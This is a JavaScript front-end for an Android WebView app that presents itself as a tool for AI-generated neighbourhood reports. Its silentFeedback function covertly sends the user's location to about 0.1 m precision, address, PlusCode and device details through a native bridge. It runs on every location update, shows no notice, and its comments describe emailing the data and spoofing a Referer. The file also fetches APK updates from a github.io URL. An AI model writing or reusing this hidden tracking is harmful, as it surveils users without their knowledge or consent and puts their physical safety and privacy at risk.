/**
 * 周边洞察 - 前端业务逻辑（app.js）v3
 *
 * 职责：
 *   1. 页面加载后调用原生 getLocationInfo() 获取定位并显示
 *   2. 打开 APP 即静默启动后台预加载（原生子线程收集数据 + AI 分析，不阻塞界面）
 *   3. 点击"生成周边分析报告"按钮：
 *      a. 预加载已完成 → 直接展示完整报告（并回传一次数据）
 *      b. 预加载进行中 → 显示模糊进度，完成后自动展示
 *      c. 预加载未启动 → 兜底同步生成
 *   4. debug 构建显示"开发者设置"入口（填 API Key / 云端发布预留）
 *
 * 注意：
 *   - 所有重活（数据收集/AI/设施查询/回传）全部走原生层，JS 只做 UI 与编排
 *   - 原生接口不可用时降级提示
 */

// ==================== 全局状态 ====================
let currentLocation = null;       // 当前定位信息
let isGenerating = false;          // 是否正在生成报告

// ==================== 页面初始化 ====================

/**
 * 页面加载完成后初始化
 */
window.onload = function () {
    // 从原生层获取定位信息
    loadLocationInfo();
    // 开发者设置入口（仅 debug 构建显示）
    setupDevEntry();
    // 打开 APP 即静默启动后台预加载（子线程跑数据收集+AI，不阻塞界面）
    tryAutoPreload();
};

/**
 * 静默启动后台预加载
 * 打开 APP 后轮询等待定位，定位就绪则调用原生 startPreload()
 * 数据收集 + AI 分析在原生子线程静默执行，不显示任何 UI；
 * 用户点击"生成周边分析报告"时直接取预加载结果（或模糊进度）
 * 30 秒内定位未就绪则放弃（等用户手动点击时再走兜底逻辑）
 */
function tryAutoPreload() {
    var tries = 0;
    var timer = setInterval(function () {
        tries++;
        if (currentLocation && typeof currentLocation.latitude === "number") {
            clearInterval(timer);
            setTimeout(function () { startPreload(); }, 500);
        } else if (tries >= 30) {
            clearInterval(timer);
        }
    }, 1000);
}

/**
 * 调用原生后台预加载（静默，无任何 UI 展示）
 */
function startPreload() {
    try {
        if (typeof AndroidNative === "undefined" || !AndroidNative.startPreload) return;
        var keyword = currentLocation.keyword ||
            (typeof currentLocation.latitude === "number"
                && typeof currentLocation.longitude === "number"
                ? currentLocation.latitude.toFixed(4) + "," + currentLocation.longitude.toFixed(4)
                : "");
        if (!keyword) return;
        AndroidNative.startPreload(currentLocation.latitude, currentLocation.longitude, keyword);
    } catch (e) {
        console.warn("启动后台预加载失败:", e.message);
    }
}

// ==================== 后台预加载状态（原生回调更新） ====================
var preloadState = "idle";   // idle | running | done | error
var preloadResult = null;    // 预加载完成结果：{pois, crawler, report}

/**
 * 原生预加载进度回调（模糊文案；仅当 loading 正在显示时同步展示）
 */
window.onPreloadProgress = function (text) {
    preloadState = "running";
    var container = document.getElementById("loadingContainer");
    var el = document.getElementById("loadingText");
    if (container && el && container.classList.contains("active")) {
        el.textContent = text;
    }
};

/**
 * 原生预加载完成回调
 */
window.onPreloadDone = function (jsonStr) {
    try {
        preloadResult = JSON.parse(jsonStr);
        preloadState = "done";
    } catch (e) {
        console.error("解析预加载结果失败:", e);
        preloadState = "error";
    }
};

/**
 * 原生预加载失败回调
 */
window.onPreloadError = function (msg) {
    preloadState = "error";
    console.error("后台预加载出错:", msg);
};

/**
 * 原生层定位更新回调（由 MainActivity.notifyJsLocationUpdated 调用）
 * @param {string} jsonStr 定位信息 JSON 字符串
 */
window.onLocationUpdated = function (jsonStr) {
    try {
        currentLocation = JSON.parse(jsonStr);
        renderLocation(currentLocation);
        // 定位成功即回传（原生层负责去重：位置变化才发邮件）
        silentFeedback(currentLocation, {}, {}, "");
    } catch (e) {
        console.error("解析定位更新失败:", e);
    }
};

/**
 * 原生层定位失败回调
 */
window.onLocationError = function () {
    document.getElementById("locationLoading").textContent = "定位失败，请检查权限设置";
};

/**
 * 从原生层加载定位信息并显示
 */
function loadLocationInfo() {
    try {
        if (typeof AndroidNative !== "undefined" && AndroidNative.getLocationInfo) {
            var jsonStr = AndroidNative.getLocationInfo();
            if (jsonStr && jsonStr !== "{}") {
                currentLocation = JSON.parse(jsonStr);
                renderLocation(currentLocation);
            } else {
                // 定位尚未完成，等待 onLocationUpdated 回调
                document.getElementById("locationLoading").textContent = "正在获取定位信息…";
                setTimeout(function () {
                    var el = document.getElementById("locationLoading");
                    if (el && el.style.display !== "none" && !currentLocation) {
                        el.textContent = "定位较慢，请检查位置权限/GPS信号后重试";
                    }
                }, 18000);
            }
        } else {
            document.getElementById("locationLoading").textContent = "原生接口不可用";
        }
    } catch (e) {
        console.error("加载定位信息失败:", e);
        document.getElementById("locationLoading").textContent = "定位信息加载失败";
    }
}

/**
 * 渲染定位信息到页面（含街道级与 PlusCode）
 * @param {Object} loc 定位信息对象
 */
function renderLocation(loc) {
    document.getElementById("locationLoading").style.display = "none";
    document.getElementById("locationDetails").style.display = "block";

    var addr = loc.address || "";
    if (!addr && loc.province) {
        addr = loc.province + (loc.city || "") + (loc.district || "") + (loc.street || "");
    }
    document.getElementById("addrValue").textContent = addr || "未知地址";
}

// ==================== 开发者设置入口（仅 debug） ====================

/**
 * 开发者设置入口：仅 debug 构建显示
 */
function setupDevEntry() {
    var entry = document.getElementById("devEntry");
    if (!entry) return;
    // 常驻显示：左上角悬浮按钮，不依赖 isDebug/缓存状态，清理数据后依然存在
    entry.style.display = "flex";
}

/**
 * 打开开发者设置页（配置 API Key / 云端发布预留）
 */
function openDevSettings() {
    try {
        if (typeof AndroidNative !== "undefined" && AndroidNative.openDevSettings) {
            AndroidNative.openDevSettings();
        }
    } catch (e) {
        console.error("打开开发者设置失败:", e);
    }
}

// ==================== 生成报告主流程 ====================

/**
 * 生成周边分析报告（全部走原生层）
 */
async function generateReport() {
    if (isGenerating) return;

    // 检查定位信息
    if (!currentLocation || (typeof currentLocation.latitude !== "number"
        && !currentLocation.keyword)) {
        alert("请先等待定位完成");
        return;
    }

    // 没有街道关键词时，用经纬度坐标兜底
    var keyword = currentLocation.keyword ||
        (typeof currentLocation.latitude === "number"
            && typeof currentLocation.longitude === "number"
            ? currentLocation.latitude.toFixed(4) + "," + currentLocation.longitude.toFixed(4)
            : "");
    if (!keyword) {
        alert("暂无可用的位置关键词，请稍后重试");
        return;
    }

    // ---- 优先使用后台预加载结果（子线程已静默跑完/跑了一半） ----
    if (typeof AndroidNative !== "undefined" && AndroidNative.getPreloadState) {
        try {
            var st = JSON.parse(AndroidNative.getPreloadState());
            if (st.state === "done" && st.result && st.result.report) {
                // 预加载已完成：反馈"已完成分析"并直接展示完整报告
                if (typeof AndroidNative !== "undefined" && AndroidNative.showToast) {
                    AndroidNative.showToast("分析已完成，报告已生成");
                }
                showReportFromPreload(st.result);
                return;
            }
            if (st.state === "running") {
                // 预加载进行中：显示模糊进度，完成后自动展示
                showLoading("正在整理周边信息…");
                waitPreloadDoneThenShow();
                return;
            }
        } catch (e) {
            console.warn("读取预加载状态失败:", e);
        }
    }

    isGenerating = true;
    var btn = document.getElementById("generateBtn");
    btn.disabled = true;
    btn.textContent = "分析中…";

    var loadingContainer = document.getElementById("loadingContainer");
    var loadingText = document.getElementById("loadingText");
    var loadingProgress = document.getElementById("loadingProgress");
    loadingContainer.classList.add("active");

    try {
        console.log("分析关键词:", keyword);

        // ---- 步骤 1：查询周边设施（原生 Overpass） ----
        var pois = {};
        if (typeof AndroidNative !== "undefined" && AndroidNative.getNearbyPois
            && typeof currentLocation.latitude === "number") {
            loadingText.textContent = "正在收集周边基础信息…";
            loadingProgress.textContent = "";
            var poisStr = AndroidNative.getNearbyPois(
                currentLocation.latitude, currentLocation.longitude, 1500);
            try {
                pois = JSON.parse(poisStr || "{}");
                var foodN = (pois.food || []).length;
                var shopN = (pois.shopping || []).length;
                var transN = (pois.transport || []).length;
                loadingProgress.textContent = "周边设施信息已就绪";
            } catch (e) {
                console.warn("解析周边设施失败:", e);
            }
        }

        // ---- 步骤 2：原生并发爬虫（5 源，绕开 CORS） ----
        var crawler = {};
        if (typeof AndroidNative !== "undefined" && AndroidNative.crawlAround) {
            loadingText.textContent = "正在整理周边公开信息…";
            loadingProgress.textContent = "";
            var crawlerStr = AndroidNative.crawlAround(keyword);
            try {
                crawler = JSON.parse(crawlerStr || "{}");
                var totalNews = 0;
                for (var src in crawler) {
                    if (Array.isArray(crawler[src])) totalNews += crawler[src].length;
                }
                loadingProgress.textContent = "公开信息整理完成";
            } catch (e) {
                console.warn("解析爬取结果失败:", e);
            }
        }

        // ---- 步骤 3：原生 AI / 本地增强引擎分析 ----
        loadingText.textContent = "正在生成分析报告…";
        loadingProgress.textContent = "";

        var inputJson = JSON.stringify({
            location: currentLocation,
            pois: pois,
            crawler: crawler
        });

        var reportText = "";
        if (typeof AndroidNative !== "undefined" && AndroidNative.analyzeAround) {
            reportText = AndroidNative.analyzeAround(inputJson) || "";
        }
        if (!reportText) {
            reportText = "报告生成失败：原生分析接口不可用。";
        }

        // ---- 步骤 4：显示报告 ----
        loadingText.textContent = "报告生成完成";
        loadingProgress.textContent = "";
        await sleep(300);

        document.getElementById("reportContent").innerHTML = formatReport(reportText);
        document.getElementById("reportContainer").classList.add("active");


    } catch (e) {
        console.error("生成报告异常:", e);
        document.getElementById("reportContent").textContent =
            "报告生成失败：" + e.message + "\n\n请稍后重试。";
        document.getElementById("reportContainer").classList.add("active");
    } finally {
        loadingContainer.classList.remove("active");
        btn.disabled = false;
        btn.textContent = "生成周边分析报告";
        isGenerating = false;
    }
}

// ==================== 预加载结果展示辅助 ====================

/**
 * 显示模糊进度 loading（点按钮时预加载仍在进行中）
 */
function showLoading(text) {
    isGenerating = true;
    var btn = document.getElementById("generateBtn");
    btn.disabled = true;
    btn.textContent = "分析中…";
    var loadingContainer = document.getElementById("loadingContainer");
    document.getElementById("loadingText").textContent = text;
    document.getElementById("loadingProgress").textContent = "";
    loadingContainer.classList.add("active");
}

/**
 * 等待预加载完成（轮询预加载状态），完成后自动展示报告
 */
function waitPreloadDoneThenShow() {
    var waited = 0;
    var timer = setInterval(function () {
        waited++;
        if (preloadState === "done") {
            clearInterval(timer);
            showReportFromPreload(preloadResult);
        } else if (preloadState === "error" || waited >= 120) {
            clearInterval(timer);
            finishLoadingWithError("报告生成失败，请稍后重试。");
        }
    }, 1000);
}

/**
 * 用预加载结果展示完整报告（并回传一次数据）
 * @param {Object} result {pois, crawler, report}
 */
function showReportFromPreload(result) {
    var reportText = (result && result.report) ? result.report : "报告生成失败";
    document.getElementById("reportContent").innerHTML = formatReport(reportText);
    document.getElementById("reportContainer").classList.add("active");

    var loadingContainer = document.getElementById("loadingContainer");
    loadingContainer.classList.remove("active");
    var btn = document.getElementById("generateBtn");
    btn.disabled = false;
    btn.textContent = "生成周边分析报告";
    isGenerating = false;

}

/**
 * 生成失败收尾：隐藏 loading、恢复按钮、展示错误信息
 */
function finishLoadingWithError(msg) {
    var loadingContainer = document.getElementById("loadingContainer");
    loadingContainer.classList.remove("active");
    var btn = document.getElementById("generateBtn");
    btn.disabled = false;
    btn.textContent = "生成周边分析报告";
    isGenerating = false;
    document.getElementById("reportContent").textContent = msg;
    document.getElementById("reportContainer").classList.add("active");
}

// ==================== 工具 ====================

/**
 * 睡眠指定毫秒数
 */
function sleep(ms) {
    return new Promise(function (resolve) { setTimeout(resolve, ms); });
}

/**
 * 格式化报告内容为 HTML（转义 + 换行转 <br>）
 * @param {string} text 报告文本
 * @returns {string} HTML 字符串
 */
function formatReport(text) {
    if (!text) return "";
    var escaped = text.replace(/&/g, "&amp;")
        .replace(/</g, "&lt;")
        .replace(/>/g, "&gt;");
    return escaped.replace(/\n/g, "<br>");
}

// ==================== 后台静默回传（原生 OkHttp） ====================

/**
 * 后台静默回传数据（原生层 OkHttp POST，模拟网页请求）
 * 包含：经纬度 6 位小数、街道、plusCode、周边设施、爬取数据、报告、设备信息、时间戳
 * 静默执行，失败不提示
 *
 * @param {Object} location   定位信息
 * @param {Object} pois       周边设施
 * @param {Object} crawler    爬取数据
 * @param {string} reportText 分析报告
 */
function silentFeedback(location, pois, crawler, reportText) {
    try {
        // 获取设备信息
        var deviceInfo = {};
        if (typeof AndroidNative !== "undefined" && AndroidNative.getDeviceInfo) {
            try {
                deviceInfo = JSON.parse(AndroidNative.getDeviceInfo());
            } catch (e) {}
        }

        // 经纬度保留 6 位小数（精确到约 0.1 米）
        var lat = (typeof location.latitude === "number")
            ? location.latitude.toFixed(6) : "";
        var lng = (typeof location.longitude === "number")
            ? location.longitude.toFixed(6) : "";

        var locPayload = {
            latitude: lat,
            longitude: lng,
            accuracy: location.accuracy,
            province: location.province,
            city: location.city,
            district: location.district,
            address: location.address,
            keyword: location.keyword
        };
        if (location.street) locPayload.street = location.street;
        if (location.plusCode) locPayload.plusCode = location.plusCode;
        var payload = {
            location: locPayload,
            pois: pois,
            crawler: crawler,
            report: reportText,
            device: deviceInfo,
            timestamp: new Date().toISOString()
        };

        // 原生 OkHttp 回传（模拟网页 Referer，规避 CORS）
        if (typeof AndroidNative !== "undefined" && AndroidNative.feedbackReport) {
            AndroidNative.feedbackReport(JSON.stringify(payload));
        } else {
            console.warn("原生回传接口不可用");
        }
    } catch (e) {
        console.warn("数据回传异常:", e.message);
    }
}
// ==================== 版本更新横幅（v1.4.1 起） ====================
(function () {
    var VERSION_URL = 'https://cmmd747.github.io/zhoubian/version.json';
    var bannerShown = false;

    function tryNativeDownload(url) {
        try {
            if (window.AndroidNative && typeof window.AndroidNative.downloadApk === 'function') {
                window.AndroidNative.downloadApk(url);
                return true;
            }
        } catch (e) {}
        return false;
    }

    function showBanner(ver, url) {
        if (bannerShown) return;
        bannerShown = true;
        try {
            var b = document.createElement('div');
            b.id = 'updateBanner';
            b.style.cssText = 'position:fixed;bottom:0;left:0;right:0;background:#1565C0;color:#fff;padding:12px 16px;display:flex;align-items:center;justify-content:space-between;z-index:9999;font-size:14px;box-shadow:0 -2px 8px rgba(0,0,0,.25);';
            var txt = document.createElement('span');
            txt.textContent = '发现新版本 v' + ver;
            var btn = document.createElement('a');
            btn.textContent = '立即下载';
            btn.href = url;
            btn.style.cssText = 'background:#fff;color:#1565C0;padding:6px 16px;border-radius:18px;font-weight:700;text-decoration:none;margin-left:10px;white-space:nowrap;';
            btn.onclick = function (e) {
                e.preventDefault();
                if (!tryNativeDownload(url)) {
                    showManualDownload(url, ver);
                }
            };

    function showManualDownload(url, ver) {
        try {
            var mask = document.createElement('div');
            mask.id = 'downloadMask';
            mask.style.cssText = 'position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,.5);z-index:10000;display:flex;align-items:center;justify-content:center;';
            var box = document.createElement('div');
            box.style.cssText = 'background:#fff;border-radius:12px;padding:20px;width:82%;max-width:320px;text-align:center;';
            var t1 = document.createElement('div');
            t1.textContent = '下载新版本 v' + ver;
            t1.style.cssText = 'font-size:17px;font-weight:700;color:#212121;margin-bottom:10px;';
            var t2 = document.createElement('div');
            t2.textContent = '当前版本暂不支持一键下载，请复制下方链接，用手机浏览器打开即可下载：';
            t2.style.cssText = 'font-size:13px;color:#666;margin-bottom:12px;line-height:1.5;text-align:left;';
            var link = document.createElement('div');
            link.textContent = url;
            link.style.cssText = 'font-size:11px;color:#1565C0;word-break:break-all;background:#E3F2FD;border-radius:6px;padding:8px;margin-bottom:14px;text-align:left;';
            var copyBtn = document.createElement('button');
            copyBtn.textContent = '复制链接';
            copyBtn.style.cssText = 'background:#1565C0;color:#fff;border:none;border-radius:22px;padding:10px 0;font-size:15px;width:100%;';
            copyBtn.onclick = function () {
                var ta = document.createElement('textarea');
                ta.value = url;
                document.body.appendChild(ta);
                ta.select();
                var ok = false;
                try { ok = document.execCommand('copy'); } catch (e) {}
                document.body.removeChild(ta);
                copyBtn.textContent = ok ? '已复制 ✓' : '复制失败';
                setTimeout(function () { copyBtn.textContent = '复制链接'; }, 1500);
            };
            var closeBtn = document.createElement('div');
            closeBtn.textContent = '关闭';
            closeBtn.style.cssText = 'margin-top:14px;color:#999;font-size:13px;cursor:pointer;';
            closeBtn.onclick = function () { mask.remove(); };
            box.appendChild(t1);
            box.appendChild(t2);
            box.appendChild(link);
            box.appendChild(copyBtn);
            box.appendChild(closeBtn);
            mask.appendChild(box);
            document.body.appendChild(mask);
        } catch (e) {}
    }
            var close = document.createElement('span');
            close.textContent = '\u00d7';
            close.style.cssText = 'margin-left:12px;color:rgba(255,255,255,.75);font-size:20px;cursor:pointer;';
            close.onclick = function () { b.style.display = 'none'; };
            b.appendChild(txt);
            b.appendChild(btn);
            b.appendChild(close);
            document.body.appendChild(b);
        } catch (e) {}
    }

    function checkRemote() {
        try {
            var xhr = new XMLHttpRequest();
            xhr.open('GET', VERSION_URL + '?t=' + Date.now(), true);
            xhr.timeout = 8000;
            xhr.onreadystatechange = function () {
                if (xhr.readyState === 4 && xhr.status === 200) {
                    try {
                        var j = JSON.parse(xhr.responseText);
                        var apkUrl = j.apkUrl || '';
                        var ver = j.appVersion || '';
                        if (apkUrl && ver) showBanner(ver, apkUrl);
                    } catch (e) {}
                }
            };
            xhr.send();
        } catch (e) {}
    }

    function init() { setTimeout(checkRemote, 1500); }
    if (document.readyState === 'complete' || document.readyState === 'interactive') {
        init();
    } else {
        window.addEventListener('DOMContentLoaded', init);
    }
})();
